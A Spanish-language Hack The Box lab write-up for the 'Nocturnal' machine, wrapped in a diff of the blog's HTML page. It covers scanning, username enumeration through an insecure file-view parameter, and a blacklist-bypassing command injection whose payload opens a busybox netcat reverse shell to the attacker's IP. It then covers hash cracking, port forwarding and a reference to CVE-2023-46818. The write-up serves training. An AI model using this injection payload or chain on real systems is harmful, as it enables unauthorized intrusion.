@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <title>Nocturnal - HTB | IS0L3D</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"  href="/css/writeups.css" 
+  >
+
+</head>
+<body>
+  <div id="vanta-globe"></div>
+  <nav class="navbar" aria-label="Navegacion principal">
+  <ul>
+    <li class="left-item"><a href="/">IS0L3D</a></li>
+    <li class="right-item">
+        <a href="/">Bio</a>
+      </li>
+    <li class="right-item">
+        <a href="/notas/">Notas</a>
+      </li>
+    <li class="right-item active">
+        <a href="/writeups/">Writeups</a>
+      </li>
+    
+  </ul>
+</nav>
+
+  <main class="site-main">
+    
+<div class="wp-drawer-toolbar wp-drawer-toolbar-single">
+  <button
+    class="wp-drawer-toggle wp-toc-toggle"
+    type="button"
+    aria-expanded="false"
+    aria-controls="wp-right-panel"
+    data-target="#wp-right-panel">
+    Contenido
+  </button>
+</div>
+<div class="wp-drawer-overlay" hidden></div>
+
+<div class="wp-grid wp-grid-single">
+  <aside class="wp-left">
+    <nav class="wp-nav" aria-label="Writeups por categoria">
+  <h3>Categorias</h3>
+  
+    
+    
+      
+      
+        
+        <details>
+          <summary>
+            <a href="/categories/htb/">htb</a>
+            <small>(1)</small>
+          </summary>
+          <ul>
+            
+              <li class="active">
+                <a href="/writeups/htb/nocturnal/">Nocturnal - HTB</a>
+              </li>
+            
+          </ul>
+        </details>
+      
+    
+      
+      
+        
+        <details>
+          <summary>
+            <a href="/categories/linux/">linux</a>
+            <small>(1)</small>
+          </summary>
+          <ul>
+            
+              <li class="active">
+                <a href="/writeups/htb/nocturnal/">Nocturnal - HTB</a>
+              </li>
+            
+          </ul>
+        </details>
+      
+    
+      
+      
+    
+      
+      
+    
+    
+  
+</nav>
+
+  </aside>
+
+  <article class="wp-center">
+    <header class="wp-header">
+      <h1>Nocturnal - HTB</h1>
+      
+      <p class="wp-meta">
+        <time datetime="2025-07-26 00:00:00 &#43;0000 UTC">2025-07-26</time>
+         &middot; HTB
+         &middot; Easy
+      </p>
+    </header>
+    <div class="wp-content">
+      <p><img src="image.png" alt="image.png"></p>
+<p>Inicia la fase de reconocimiento validando que la maquina se encuentra encendida y que es posible alcanzarla en la dirección IP 10.10.11.64, ejecutamos el comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">ping</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">10.10.11.64</span>
+</span></span></code></pre></div><p><img src="image%201.png" alt="Debido a su proximidad con un TTL de 64, el sistema operativo podría ser Linux"></p>
+<p>Debido a su proximidad con un TTL de 64, el sistema operativo podría ser Linux</p>
+<p>Se ejecuta un primer escaneo con la herramienta <strong>nmap</strong> para descubrir los puertos abiertos en la maquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">nmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">p</span><span style="color:#f92672">-</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">sS</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">open</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">vvv</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">min</span><span style="color:#f92672">-</span><span style="color:#a6e22e">rate</span> <span style="color:#ae81ff">5000</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">Pn</span> <span style="color:#ae81ff">10.10.11.64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">oG</span> <span style="color:#a6e22e">recon</span>
+</span></span></code></pre></div><p><img src="Captura_de_pantalla_2025-07-15_120821.png" alt="Captura de pantalla 2025-07-15 120821.png"></p>
+<p>Es posible obtener información más detallada sobre los servicios expuestos y sus respectivas versiones a través de un segundo escaneo dirigido a los puertos 80 y 22.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sudo</span> <span style="color:#a6e22e">nmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">sCV</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">p80</span>,<span style="color:#ae81ff">22</span> <span style="color:#ae81ff">10.10.11.64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">oN</span> <span style="color:#a6e22e">detail</span>
+</span></span></code></pre></div><p><img src="image%202.png" alt="image.png"></p>
+<p>Al visitar la página web observamos que ofrece un servicio de subida y visualización de archivos, es posible crear una cuenta e iniciar sesión.</p>
+<p><img src="image%203.png" alt="image.png"></p>
+<p>Si registramos un usuario e iniciamos sesión somos redirigidos al endpoint <em>/dashboard.php</em> en donde tenemos la capacidad de subir cierto tipo de archivos, si intentamos subir un archivo diferente a los permitidos mostrará el mensaje &ldquo;<em>Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.</em>&rdquo;</p>
+<p><img src="image%204.png" alt="image.png"></p>
+<p>La sección &ldquo;Your Files&rdquo; muestra una lista de los archivos subidos por el usuario, por ejemplo <em>example.pdf</em></p>
+<p><img src="image%205.png" alt="image.png"></p>
+<p>Automáticamente se genera un link de descarga con la siguiente estructura:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>[<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//nocturnal.htb/view.php?username=test&amp;file=example.pdf](http://nocturnal.htb/view.php?username=test&amp;file=example.pdf)
+</span></span></span></code></pre></div><p>Si modificamos el nombre de usuario por uno que no exista recibimos la respuesta:</p>
+<p><img src="image%206.png" alt="image.png"></p>
+<p>Utilizaremos esta cadena &ldquo;User not found.&rdquo; en la respuesta para con <strong>ffuf</strong> enumerar usuarios validos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u <span style="color:#e6db74">&#34;[http://nocturnal.htb/view.php?username=FUZZ&amp;file=example.pdf](http://nocturnal.htb/view.php?username=FUZZ&amp;file=example.pdf)&#34;</span> -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -fr <span style="color:#e6db74">&#34;User not found.&#34;</span> -b <span style="color:#e6db74">&#34;PHPSESSID=hhmdcqb6v8d44ifruulbhq6ucr&#34;</span>
+</span></span></code></pre></div><p><img src="image%207.png" alt="image.png"></p>
+<p>Al visitar nuevamente el link de descarga sustituyendo el usuario <strong>test</strong> por <strong>amanda</strong> de la forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//nocturnal.htb/view.php?username=amanda&amp;file=example.pdf](http://nocturnal.htb/view.php?username=amanda&amp;file=example.pdf)
+</span></span></span></code></pre></div><p>La respuesta muestra que no existe el archivo &ldquo;example.pdf&rdquo; para dicho usuario, sin embargo es posible observar los archivos subidos previamente.</p>
+<p><img src="image%208.png" alt="image.png"></p>
+<p>Este documento es una carta del equipo de TI y contiene una contraseña.</p>
+<p><img src="image%209.png" alt="image.png"></p>
+<p>El usuario amanda cuenta con privilegios administrativos. Al autenticarse, obtiene acceso a un panel de administración que permite visualizar el código fuente de archivos PHP alojados en el servidor web.</p>
+<p><img src="image%2010.png" alt="image.png"></p>
+<p>También, existe la opción de crear un backup del sitio en formato zip y protegerlo con contraseña</p>
+<p><img src="image%2011.png" alt="image.png"></p>
+<p>La lógica detrás de esta funcionalidad es la siguiente:</p>
+<p><img src="image%2012.png" alt="image.png"></p>
+<p>La función cleanEntry() sanitiza la contraseña ingresada por el usuario y luego se incluye dentro del comando que ejecuta la creación del backup.</p>
+<p><img src="image%2013.png" alt="image.png"></p>
+<p>Una lista de caracteres no permitidos dificulta la inyección de comandos, sin embargo puede ser evadida y establecer una reverse shell si utilizamos saltos de línea y tabulaciones para separar instrucciones, la solicitud enviada utilizando Burp Suite es la siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>password<span style="color:#f92672">=</span>is0l3d%0Abusybox%09nc%0910.10.16.11%0983%09-e%09/bin/sh%0A&amp;backup<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p><img src="image%2014.png" alt="image.png"></p>
+<p>De vuelta en el código, en el archivo dasboard.php se hace referencia a una base de datos SQLite3 que es posible consultar a través de la reverse shell previamente entablada.</p>
+<p><img src="image%2015.png" alt="image.png"></p>
+<p>Esta base de datos contiene las tablas uploads y users con usuarios y contraseñas hasheadas en md5:</p>
+<p><img src="image%2016.png" alt="image.png"></p>
+<p>El usuario tobias fue identificado también en la máquina comprometida.</p>
+<p><img src="image%2017.png" alt="image.png"></p>
+<p>Tras obtener su hash y realizar un ataque de fuerza bruta exitoso utilizando Hashcat, se logró descubrir su contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> hashes.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+</span></span></code></pre></div><p><img src="image%2018.png" alt="image.png"></p>
+<p>Esta credencial resultó ser reutilizada en el sistema, lo que permitió escalar privilegios lateralmente desde el usuario limitado <code>www-data</code> al usuario <code>tobias</code>.  Como resultado, se obtuvo acceso la primera bandera.</p>
+<p>Con la herramienta <code>ss</code> se obtiene un volcado de las conexiones de red en la maquina comprometida:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -tulnp
+</span></span></code></pre></div><p><img src="image%2019.png" alt="image.png"></p>
+<p>El puerto 8080 aparece activo internamente, con <code>ssh</code> se redirecciona el puerto 8080 de la maquina victima al puerto 8081 de la maquina atacante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 8081:127.0.0.1:8080 <span style="color:#f92672">[</span>tobias@10.10.11.64<span style="color:#f92672">](</span>mailto:tobias@10.10.11.64<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><img src="image%2020.png" alt="image.png"></p>
+<p>El servicio expuesto es una herramienta open source para la gestión de servidores, usuarios, cronjobs y otras funcionalidades criticas del sistema, las credenciales <code>admin</code> y la contraseña para el usuario <code>tobias</code>son validas para iniciar sesión.</p>
+<p><img src="image%2021.png" alt="image.png"></p>
+<p>La versión 3.2.11 y sus anteriores son vulnerables a:<code>CVE-2023-46818.</code>Permite la ejecución arbitraria de código php.</p>
+<p><img src="image%2022.png" alt="image.png"></p>
+<p>Se emplea un exploit de acceso público para obtener una shell con privilegios de administrador en el sistema.</p>
+
+    </div>
+  </article>
+
+  <aside class="wp-right" id="wp-right-panel">
+    
+<div class="toc-box">
+  <h3>Contenido</h3>
+  <nav id="TableOfContents"></nav>
+</div>
+
+
+  </aside>
+</div>
+
+  </main>
+
+  <script src="/js/three.min.js"></script>
+  <script src="/js/vanta.globe.min.js"></script>
+  <script src="/js/vanta.effect.js"></script>
+  
+  <script src="/js/writeups.drawer.js"></script>
+  
+  <script src="/js/goat.counter.js"></script>
+  <footer>
+  <p>&copy; 2026 Made with ❤️ by IS0L3D. Todos los derechos reservados.</p>
+  <p>Contacto: <a href="https://www.linkedin.com/in/arruchaeduardo" target="_blank" rel="noopener noreferrer">https://www.linkedin.com/in/arruchaeduardo</a></p>
+</footer>
+
+</body>
+</html>
